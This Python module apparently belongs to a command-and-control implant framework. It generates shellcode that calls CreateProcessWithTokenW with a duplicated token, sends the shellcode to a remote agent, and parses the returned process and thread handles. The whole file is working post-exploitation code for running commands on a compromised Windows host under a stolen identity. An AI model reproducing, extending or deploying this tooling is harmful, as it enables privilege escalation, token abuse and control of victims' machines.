NAME = "CreateProcessWithToken"
DESCRIPTION = "Execute a command using advapi32!CreateProcessWithTokenW using a duplicated token"
PARAMS = [
    {"name":"command_line", "description":"Command to run (UTF-16)", "type":"str"},
    {"name":"h_token", "description":"Handle for the duplicated primary token", "type":"hex"},
    {"name":"h_pipe", "description":"Handle for stdout redirection", "type":"hex", "optional":True, "default":0x0},
    {"name":"show_window", "description":"Value for wShowWindow in SI struct.", "type":"hex", "optional":True, "default":0x1},
]
DEPENDENCIES = []
DEFAULT = True
def build_si_struct(buffer_add, flags, flags_data):
    import struct
    # hStdOutput = h_pipe, hStdError = h_pipe
    si_data = bytearray(104)
    struct.pack_into('<I', si_data, 0, 104)      # cb
    struct.pack_into('<I', si_data, 60, flags)   # dwFlags
    for i in range(len(flags_data)):
        print(flags_data[i])
        flag_offset, flag_size, flag_bytes = flags_data[i]
        si_data[flag_offset:flag_offset+flag_size] = flag_bytes
    return si_data, buffer_add+104

def CreateProcessWithTokenW(agent_id, command_line, h_token, h_flags, h_flags_data):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import build_ptr, push_rtl, align_up
    import struct

    agent = Agent.by_id(agent_id)
    scratchpad = agent.scratchpad
    # Resolve advapi32!CreateProcessWithTokenW address
    print(f"***************** {scratchpad}")
    func_addr = Syscall.sys(agent.id, "CreateProcessWithTokenW")

    # Memory Layout in p_private:
    # 0x0: PROCESS_INFORMATION Struct (24 bytes)
    # 0x18: STARTUPINFOW Struct (104 bytes)
    # 0x80: Command Line String (UTF-16 Wide)
    
    # 1. Build PROCESS_INFORMATION (24 bytes)
    pi_data, si_ptr = build_ptr(scratchpad, b"\x00" * align_up(24, 16))
    
    # 2. Build STARTUPINFOW (104 bytes)
    # Using 0x400 (STARTF_USESTDHANDLES) is common if you have pipe handles, 
    # but for simplicity, we initialize cb size.
    si_data, cmdline_ptr = build_si_struct(si_ptr, h_flags, h_flags_data)
    
    # CreateProcessWithTokenW expects a mutable wide string
    encoded_cmd = command_line.encode('utf-16-le') + b'\x00\x00'
    cmdline_data, _ = build_ptr(cmdline_ptr, encoded_cmd)

    # CreateProcessWithTokenW Parameters:
    # 1. hToken (RCX)
    # 2. dwLogonFlags (RDX) -> 0x1 (LOGON_WITH_PROFILE) or 0x2 (LOGON_NETCREDENTIALS_ONLY)
    # 3. lpApplicationName (R8) -> NULL (0)
    # 4. lpCommandLine (R9) -> Pointer to Wide String
    # 5. dwCreationFlags ([RSP+0x20]) -> 0
    # 6. lpEnvironment ([RSP+0x28]) -> NULL (0)
    # 7. lpCurrentDirectory ([RSP+0x30]) -> NULL (0)
    # 8. lpStartupInfo ([RSP+0x38]) -> Pointer to STARTUPINFOW
    # 9. lpProcessInformation ([RSP+0x40]) -> Pointer to PROCESS_INFORMATION
    
    params = [
        h_token,
        0x00000001,    # dwLogonFlags: LOGON_WITH_PROFILE
        0,             # lpApplicationName
        cmdline_ptr,   # lpCommandLine
        0,             # dwCreationFlags
        0,             # lpEnvironment
        0,             # lpCurrentDirectory
        si_ptr,        # lpStartupInfo
        scratchpad      # lpProcessInformation
    ]

    shellcode = push_rtl(func_addr, params, agent.debug)
    combined_data = pi_data + si_data + cmdline_data
    
    return combined_data, shellcode

def function(agent_id, args):
    from services.orders import write_scratchpad, send_and_wait, read_scratchpad
    
    command = args[0]
    h_token = args[1]
    h_pipe = args[2] # Expected as integer/hex
    wShowWindow = args[3]

    flag_data = [
        (68, 2, int.to_bytes(wShowWindow, 2, 'little')),
        (88, 8, int.to_bytes(h_pipe, 8, 'little')),
        (96, 8, int.to_bytes(h_pipe, 8, 'little'))
    ]

    # Generate data and shellcode
    data, shellcode = CreateProcessWithTokenW(agent_id, command, h_token, 0x100 | 0x1, flag_data)
    write_scratchpad(agent_id, data)
    
    # Execute
    response = send_and_wait(agent_id, shellcode)
    ret_val = int.from_bytes(response, 'little')
    result = {"retval":-1, "message":"Error creating process."}
    # Parse Result
    if ret_val != 0:
        # Read back PROCESS_INFORMATION (hProcess, hThread, dwPid, dwTid)
        result["retval"] = 0
        pi_raw = read_scratchpad(agent_id, 24)
        result["PROCESS_HANDLE"] = int.from_bytes(pi_raw[0:8], 'little')
        result["THREAD_HANDLE"] = int.from_bytes(pi_raw[8:16], 'little')
        result["dwProcessId"] = int.from_bytes(pi_raw[16:20], 'little')

    # Cleanup
    
    return result